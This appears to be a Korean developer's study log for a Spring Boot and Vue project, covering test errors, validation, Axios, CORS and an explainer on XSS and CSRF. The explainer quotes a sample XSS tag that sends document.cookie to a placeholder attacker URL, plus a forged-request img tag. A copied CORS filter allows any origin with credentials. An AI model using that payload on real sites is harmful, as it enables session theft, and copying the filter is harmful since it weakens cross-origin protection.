
### 문제

테스트 코드 작성 중 NPE 발생

테스트 코드
```
@AutoWired
private MemberService memberService;


Member member = memberService.join(userId, password, name, email);
```
에러메시지
```
java.lang.NullPointerException
	at univ.study.recruitjogbo.member.MemberServiceTest.사용자를_추가한다(MemberServiceTest.java:40)
```

### 해결

JUnit5사용

@TestInstance(TestInstance.Lifecycle.PER_CLASS) 를 추가하지 않아서

### 고민

- review도 있고 꿀팁도 있는데 둘을 하나의 인터페이스로 이어야하나?

둘을 함께 쓸 일이 없으니 분리해도 괜찮을것

- Rest하게 구현하려면 stateless 해야한다. 이러면 분산환경에서도 이득일듯

### 문제

application.yml에 주석을 한글로 달았더니 다음과 같은 error 발생

```java
java.lang.IllegalStateException: Failed to load ApplicationContext
...
Caused by: org.yaml.snakeyaml.error.YAMLException: java.nio.charset.MalformedInputException: Input length = 1
```

### 해결방법

주석을 영어로 변경

### 2주차 후기

OAuth의 버전변경과 마이그레이션으로 인해 레퍼런스간 차이로 막힘

호환되는 버전을 찾아 해결

### 에러

테스트 실행 시

```
org.junit.platform.launcher.core.DefaultLauncher handleThrowable
TestEngine with ID 'junit-jupiter' failed to execute tests
org.junit.platform.commons.util.ReflectionUtils.tryToLoadClass(Ljava/lang/String;)
```

`testImplementation 'org.junit.platform:junit-platform-commons:1.4.2'` 추가 

---

SpringBootTest 를 작성하는데 MailSender 와 같이 property를 사용하는 빈이 존재해 실제 테스트에서 사용하지도 않는 설정을 추가해야 한다.

`@TestPropertySource(properties = {"spring.config.location=classpath:/google.yml", "spring.config.location=classpath:/mail.yml"})`

---

### Cause

프로젝트를 멀티모듈로 바꾸기 위해 파일들을 옮기던 중 `DataAccessException`을 가져오지 못하는 상황이 생겼다.

```java
try {
		...
} catch (DataAccessException e) {
	throw new AuthenticationServiceException(e.getMessage(), e);
}
```

모듈을 분리하면서 Spring JPA 의존성을 사용하지 않아 발생한 문제였다. 그렇다고 사용하지 않는 JPA의 의존성을 주입받는건 과한 것같고 코드도 유지하고 싶어 `DataAccessException`이 포함된 의존성만 주입받아 해결했다.

```java
dependencies {
	...
	implementation 'org.springframework:spring-tx'
	...
}
```

### Cause

멀티 모듈로 구분하며 생긴 common 모듈에는 Spring 실행 코드가 없어 Test 코드에 autowired가 불가

Test

### Pageable을 사용하면서 생긴 문제

현재 프로젝트를 멀티모듈로 만들어서 진행중인데 모듈 분리에 대해 고민할 일이 생겨서 이를 기록합니다. 분리된 모듈은 Entity, Repository, Service로 구성된 `common`과 이를 주입받아서 사용하는 `api`, `web` 모듈이 있습니다. 그런데 

### 가입 시 학교 웹메일로 이메일 검증

프로젝트의 요구사항 중 같은 학교 학생들만 접근 가능하게 한다는 항목이 있기 때문에 가입 시 학교 이메일로 가입 인증메일을 발송합니다. 이를 위해 학교 이메일이 맞는지 검증하기 위한 Custom Validator를 추가합니다.

`@UnivEmail` 애노테이션을 정의합니다.

```java
@Constraint(validatedBy = {UnivEmailValidator.class})
@Target({ElementType.METHOD, ElementType.FIELD, ElementType.PARAMETER})
@Retention(RetentionPolicy.RUNTIME)
public @interface UnivEmail {

    String message() default "@yu.ac.kr 혹은 @ynu.ac.kr 형식의 이메일이 아닙니다.";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

}
```

애노테이션이 붙은 메소드, 필드, 파라미터를 검증할 Validator를 정의합니다.

```java
@Slf4j
public class UnivEmailValidator implements ConstraintValidator<UnivEmail, String> {

    private static final String[] domains = {
            "yu.ac.kr",
            "ynu.ac.kr"
    };

    @Override
    public void initialize(UnivEmail constraintAnnotation) {
    }

    @Override
    public boolean isValid(String email, ConstraintValidatorContext context) {
        if (isBlank(email)) {
            return false;
        }
        return Arrays.stream(domains)
                .map(domain -> domain.replace(".", "\\."))
                .anyMatch(domain -> email.matches("\\w+@" + domain));
    }

}
```

학교 이메일의 경우 도메인이 2개인 경우가 있어 두가지 모두 추가해 주었습니다. 이제 이메일 검증은 `@UnivEmail` 애노테이션으로 이루어집니다.

```java
public class JoinRequest {
    ...
    @UnivEmail
    private String email;
}
```

# 2019-10-10,11

## Enum 타입 Request Body 맵핑 실패
```
JSON parse error: Cannot deserialize instance of `java.util.ArrayList` out of START_OBJECT token
```

아래 form.serialize()를 사용하면 @ModelAttribute로 처리 가능
serialize된 결과를 확인해보면 다음과 같다. `title=f&content=f&_tags=on&tags=TWO&_tags=on&tags=THREE&_tags=on`

```js
$('#my-form').submit(function (event) {
    event.preventDefault();
    var form = $(this);
    var url = form.attr('action');

    $.ajax({
        type: "POST",
        url: url,
        data: form.serialize(),
        success: function (data) {
            alert(data);
            location.href = "/test";
        }
    });
});
```

@ModelAttribute는 Query String으로 처리되는 걸 이제알았다. form 요청은 QueryString으로 요청하기때문에 가능.

우선 @RequestParam 과 List 대신 배열을 사용해 해결 가능. List를 사용할 경우 어떤 타입으로 받아야 할 지 모르기때문에 에러가 발생하는듯.

대신 Form 데이터를 JSON으로 변환할 때 select, checkbox 등 multi select 요소를 배열로 만드는 부분을 처리해야함. 기존의 라이브러리는 동작하지 않음.

## 서버, 포스트맨, 테스트 코드에 CSRF 토큰 사용

- Postman CSRF 토큰 해결

```js
var csrfToken = postman.getResponseCookie("XSRF-TOKEN").value;
csrfToken = csrfToken.replace("<br/>", "");
postman.setEnvironmentVariable("X-CSRF-TOKEN", csrfToken);
```

위 코드를 Tests에 작성하고 Header 탭에서 X-CSRF-TOKEN 헤더를 추가하고 값으로 `{{X-CSRF-TOKEN}}` 환경변수를 지정한다.

링크: https://www.linkedin.com/pulse/how-read-cookie-value-postman-request-chaining-ishan-girdhar-oscp

## 생성자 규칙 같은 내용 정리

# 2019-10-11

## put, delete 메소드 수행 시 권한 확인

get 이랑 url이 같기 때문에 RegexRequestMatcher로 put을 확인했는데 delete 도 같이 확인할 방법 필요

## Vue를 Spring Boot에 import 하려면

# 2019-10-12

## Vue에서 Bootstrap 사용하기

```
found 10 vulnerabilities (6 moderate, 4 high)
run `npm audit fix` to fix them, or `npm audit` for details
```
얘들은 왜 뜨는걸까 고쳐야 하는걸까

# 2019-10-13

## Spring Securiy에서 crrf().disable 한 이유

검색해보니 
```
spring.io
When should you use CSRF protection? Our recommendation is to use CSRF protection for any request that could be processed by a browser by normal users. If you are only creating a service that is used by non-browser clients, you will likely want to disable CSRF protection.
```

CSRF는 브라우저에서 사용될 때를 위해 만들어졌다. 하지만 API 서버는 non-browser client이므로 csrf를 desable해도 되겠다.

https://medium.com/@OutOfBedlam/jwt-%EC%9E%90%EB%B0%94-%EA%B0%80%EC%9D%B4%EB%93%9C-53ccd7b2ba10

이걸 보니 또 아닌듯 하다

## Axios Catch()

axios로 http 요청 시 .catch() 메소드를 사용해 Exception을 처리할 수 있는데 console.log로 그냥 error를 출력해보면 서버의 응답값과는 다른 값을 확인할 수 있다.

post 요청
```js
this.$axios.post(`http://localhost:8080/api/auth`, formData)
    .then(res => {...})
    .catch(error => { console.log(error) })
}

>> Error: Request failed with status code 401
    at createError (createError.js?16d0:16)
    at settle (settle.js?db52:17)
    at XMLHttpRequest.handleLoad (xhr.js?ec6c:59)
```

응답 객체를 사용하고 싶은 경우 response 필드를 사용하면 된다.

```
.catch(error => { console.log(error) })

>> {data: {…}, status: 401, statusText: "", headers: {…}, config: {…}, …}
```

## Custom Font 사용법

App.vue에

```html
<style>
@font-face {
 font-family: 'NanumBarunGothic';
 font-style: normal;
 font-weight: 300;
 src: url('//cdn.jsdelivr.net/font-nanumlight/1.0/NanumBarunGothicWebLight.eot');
 src: url('//cdn.jsdelivr.net/font-nanumlight/1.0/NanumBarunGothicWebLight.eot?#iefix') format('embedded-opentype'), url('//cdn.jsdelivr.net/font-nanumlight/1.0/NanumBarunGothicWebLight.woff') format('woff'), url('//cdn.jsdelivr.net/font-nanumlight/1.0/NanumBarunGothicWebLight.ttf') format('truetype');
}

.nanumbarungothic * {
 font-family: 'NanumBarunGothic', sans-serif;
}

#app {
  font-family: 'NanumBarunGothic', Courier, monospace;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
</style>
```

# 2019-10-15

## 테스트 mock() when()

## 보안 관련 정리

## XSS (Cross-site Scripting)

사용자가 접근하는 html 파일 내부에 스크립트를 넣어 악의적인 기능을 수행.

의도하지 않은 기능 수행이나 사용자의 쿠기, 세션 토큰 등의 민감한 정보를 탈취한다.

```
<img src="#" onerror="location.href('해커가 접근가능한 URL?cookie=' + document.cookie)">
위 태그가 삽입된 페이지를 보는 순간 사용자의 브라우저에서 cookie정보를 가져와 해커 URL로 전송한다.
```

주로 사용되는 기법으로는 스크립트 태그, 이벤트 속성, 블랙리스트 우회 등이 있으며 [여기](https://namu.wiki/w/XSS)에서 더욱 자세히 확인할 수 있습니다.

OWASP에서 발표한 XSS 공격 방지 7계명
> 0. 허용된 위치가 아닌 곳에 신뢰할 수 없는 데이터가 들어가는것을 허용하지 않는다.
> 1. 신뢰할 수 없는 데이터는 검증을 하여라.
> 2. HTML 속성에 신뢰할 수 없는 데이터가 들어갈 수 없도록 하여라.
> 3. 자바스크립트에 신뢰할 수 없는 값이 들어갈 수 없도록 하여라.
> 4. CSS의 모든 신뢰할 수 없는 값에 대해서 검증하여라.
> 5. URL 파라미터에 신뢰할 수 없는 값이 있는지 검증하여라.
> 6. HTML 코드를 전체적으로 한번 더 검증하여라.

## CSRF (Cross-site request forgery)

사용자가 로그인 후 Cookie에 인증 토큰이 존재할 때, 해커가 이메일이나 게시판에 악의적인 기능을 수행하는 스크립트를 심는다.

```
<img src= "여행 경로를 Update하는 URL?.src=Korea&.dst=Hell">
위 태크가 삽입된 페이지를 보는 순간 여행 경로를 `한국 > 지옥` 으로 update 한다.
```

서버에서는 인증된 토큰과 함께 요청되었기 때문에 정상적으로 수행하게 된다.

막기위해 일반적으로 사용하는 방법
- Referer, 서버에서 referer 헤더(요청을 보내는 순간의 URL, naver.com에서 blog.naver.com을 요청하면 naver.com이 헤더에 담긴다.)를 확인해서 domain이 일치하는지 확인하는 방법
- Security Token(CSRF Token), 사용자 세션에 임의의 난수를 저장하고 요청마다 해당 값을 포함해서 전송
- Domain Submit Cookie, 브라우저의 Same Origin 정책(자바스크립트에서 타 도메인의 쿠기 값을 확인/수정하지 못한다.)을 이용.

## Stateless Server에서 CSRF?

잘 정리된 Stackoverflow 답변이 있어 정리해본다.

[CSRF Token necessary when using Stateless(= Sessionless) Authentication? - Stackoverflow](https://stackoverflow.com/a/25198454/7070106)

CSRF는 인증에 쿠키를 사용하지 않으면 방지할 수 있다. 하지만 HTTP Basic 이나 HTTP Digest auth를 사용하면 공격할 수 있다.

하지만 XSS 공격에 노출되면 인증키를 가져올 수 있으므로 주의해야한다.

# 2019-10-16

## 그럼 내가 사용하는 Vue는 XSS에 안전한가?

한 블로그에서 다음과 같은 문장을 발견했다.

> 사용하는 데이터를 소독하지 않으면 어떤 Framework를 사용하든 XSS의 위험에 노출된다.\

## <v-html>

Raw HTML을 동적으로 렌더링하는 태그로 XSS에 노출되기 때문에 사용자가 접근할 수 없는곳에만 사용해야 한다.

{{ alert('something') }} 과 같이 사용하면 Error 발생, 왜냐하면 

# 2019-10-18

## Axios global header

`instance.defaults.headers.common['Content-Type'] = 'application/json'`

문서에는 이렇게 해서 전역 header 설정을 하라는 것 같은데 common을 제거해야 정상적으로 동작하더라. common이 다른 의미가 있는건가?

`instance.defaults.headers['Content-Type'] = 'application/json' // common 제거`

지금 겪고 있는 문제 여기에 잘 정리됨 https://www.popit.kr/cors-preflight-%EC%9D%B8%EC%A6%9D-%EC%B2%98%EB%A6%AC-%EA%B4%80%EB%A0%A8-%EC%82%BD%EC%A7%88/

## 다 해결했다 생각했는데 인증토큰이 없으면 No 'Access-Control-Allow-Origin' header is present on the requested resource.

AccessDeniedHandler랑 AuthenticationEntryPoint는 Cors 설정 영향을 안받나?

`response.setHeader("Access-Control-Allow-Origin", "*");` 해주니까 된다.

그런가보다 Stackoverflow에 보니까

```java
public class CorsFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpServletRequest request= (HttpServletRequest) servletRequest;

        response.setHeader("Access-Control-Allow-Origin", "*");
        response.setHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,PUT,OPTIONS");
        response.setHeader("Access-Control-Allow-Headers", "*");
        response.setHeader("Access-Control-Allow-Credentials", true);
        response.setHeader("Access-Control-Max-Age", 180);
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}

...

@Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .addFilterBefore(corsFilter(), SessionManagementFilter.class) //adds your custom CorsFilter
```

이렇게 처리하는 것 같다.

## Vue.js의 Error Handling

출처: https://medium.com/js-dojo/error-exception-handling-in-vue-js-application-6c26eeb6b3e4

**Common Errors And Exceptions**

- Syntax error : 문법 에러
- Runtime error : 실행 중 잘못된 기능 수행
- Logical error : 프로그램 로직 문제
- Http error : API 응답 에러

**이를 처리하는 몇가지 방법**

- syntax error : 컴파일 시 검사, static type checking(Typescript)
- runtime error : try-catch문 사용
- logical error : unit/integration Test
- http error : Promises

아래 문서에는 Vue.js 에서 error/exception을 handling 하는 방법에 대해 소개한다.

**Vue에서 error/exception을 처리하는 방법 두가지**

- Vue.js global configuration
- ErrorBoundaries, errorCaptured lifecycle hook 사용

**Vue.js Global Configuration**

suppress logs and warnings, devtools, error handler 등의 기능을 포함한 Vue.config 객체를 사용해 전역 설정을 할 수 있다.

Vue.config.errorHandler function을 사용해 기본 설정을 override 할 수 있다. `handler`는 모든 uncaught exception에 호출된다. 마치 전역 error handler와 같이 작동한다.

```js
import Vue from 'vue';
Vue.config.errorHandler = (err, vm, info) => {
  // err: error trace
  // vm: component in which error occured
  // info: Vue specific error information such as lifecycle hooks, events etc.
  
  // TODO: Perform any custom logic or log to server
};
```

errorHandler는 3개의 매개변수를 가진다.

1. err : message와 error stack을 포함한 error trace.
2. vm : error가 발생한 컴포넌트/인스턴스
3. info : lifecycle hooks, events 와 같은 Vue 전용 error 정보

> Vue.config.errorHandler는 Vue instance에서 발생한 error만 처리하며 인스턴스 외부의 utils files, services error는 처리하지 못한다.

Vue instance 밖의 error를 처리하고 싶으면 window의 `onerror` 이벤트를 쓰면 된다. handler function은 Vue instance인지 상관 없이 처리되지 않은 모든 error를 처리힌다.

```js
window.onerror = function(message, source, lineno, colno, error) {
  // TODO: write any custom logic or logs the error
};
```

**ErrorBoundaries 와 errorCaptured lifecycle hook**

Vue.js는 2.5.0 버전부터 `errorCaptured`라는 lifecycle hook을 제공한다. 이 hook은 컴포넌트 내의 error를 처리한다. 하지만 동시에 앱의 error 경계를 생성하기도 한다.

errorCaptured는 errorHandler와 매개변수가 같다.

```js
export default {
  name: "app-user-list",

  created() {
    this.$store.dispatch(actionsTypes.FETCH_USER_DATA);
  },

  errorCaptured(err, vm, info) {
    // err: error trace
    // vm: component in which error occured
    // info: Vue specific error information such as lifecycle hooks, events etc.
    // TODO: Perform any custom logic or log to server
    // return false to stop the propagation of errors further to parent or global error handler
  }
};
```

Error Boundaries는 `errorCaptured` lifecycle hook의 다른 형태입니다. 아래 errorCaptured를 구현한 컴포넌트와 error boundary

```js
<template>
  <div>
    <slot
      v-if="err"
      name="error"
      v-bind:err="err"
      v-bind:vm="vm"
      v-bind:info="info"
    >Something went wrong</slot>
    <slot v-else></slot>
  </div>
</template>

<script>
export default {
  name: "error-boundary",
  props: {
    stopPropagation: Boolean
  },
  data() {
    return {
      err: false,
      vm: null,
      info: null
    };
  },
  errorCaptured(err, vm, info) {
    this.err = err;
    this.vm = vm;
    this.info = info;
    return !this.stopPropagation;
  }
};
</script>

<style lang="scss" scoped>
</style>
```

```js
<template>
  <div class="user-list">
    <error-boundary>
      <app-user-item/>
    </error-boundary>
  </div>
</template>
```

앗 그런데 Vue는 async error를 잡지 못한다.

아래 코드로 error interceptor 가능. 그냥 `return error` 하면 then() 절에 처리되고 Promise.reject(error)로 return 해야한다.

```js
instance.interceptors.response.use(
  function (response) { return response },
  function (error) {
    console.log('error ', error)
    if (error.response) {
      const response = error.response.data.response
      if (response.status === 'UNAUTHORIZED') {
        window.location.href = `#/signin?message=${response.errorMessage}`
      }
    }
    return Promise.reject(error)
  }
)
```

## Navbar 로그인 로그아웃 토글하기